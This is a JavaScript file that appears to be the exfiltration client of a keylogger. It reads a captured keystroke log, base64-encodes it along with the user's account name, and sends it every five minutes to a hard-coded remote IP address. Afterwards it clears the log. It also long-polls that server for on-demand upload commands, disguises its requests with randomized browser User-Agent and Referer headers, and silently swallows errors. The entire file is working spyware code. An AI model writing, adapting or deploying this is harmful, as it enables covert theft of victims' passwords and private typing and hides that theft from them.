const axios = require("axios");
const fs = require("fs");
const os = require("os");
const CONFIG_PATH = "C:\\Users\\Public\\keylogger_config.txt";
const URL = "http://91.149.140.24:24242";
const LONG_POLL_TIMEOUT = 300000;

function getLogPath() {
    try {
        if (fs.existsSync(CONFIG_PATH)) {

            const configContent = fs.readFileSync(CONFIG_PATH, "utf8").trim();
            if (configContent) {
                return configContent.replace(/\\/g, '/');
            }
        }
        return "D://Clientkeylog.txt";
        
    } catch (error) {
        return "D://Clientkeylog.txt"; 
    }
}

//POST
const sendData = async () => {
    try{
        const data = getData();
        if (!data) return;

        await axios.post(`${URL}/data`, data, {
            headers: {
                "User-Agent": getRandom(userAgents),
                "Referer": getRandom(referers),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/json"
            },
            timeout: 5000 
        });

        fs.writeFileSync(getLogPath(), '');
    }catch{

    }
}

const getData = () => {
    try{
        let path = getLogPath();
        if(!fs.existsSync(path)) return null; 

        let fileData = fs.readFileSync(path, "utf8");

        if(fileData.trim() === "") return null;

        let base64data = Buffer.from(fileData, 'utf8').toString('base64');

        return {
            id: os.userInfo().username,
            data: base64data
        }
    } catch{
        return null;
    }
}

//5 min
setInterval(() => sendData(), 300000);

//LONG POLLING
const getCommand = async () => {
    try{
        const res = await axios.get(`${URL}/longpull?id=${os.userInfo().username}`, {
            timeout: LONG_POLL_TIMEOUT
        });

        if(res.data.action === "sendData"){
            await sendData();
        };

        getCommand();

    } catch{
        setTimeout(getCommand, 1000);
    }
}

getCommand();

function getRandom(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
];

const referers = [
    "https://www.google.com/",
    "https://www.youtube.com/",
    "https://www.facebook.com/",
    "https://www.instagram.com/",
    "https://stackoverflow.com/",
    "https://github.com/",
    "https://www.reddit.com/"
];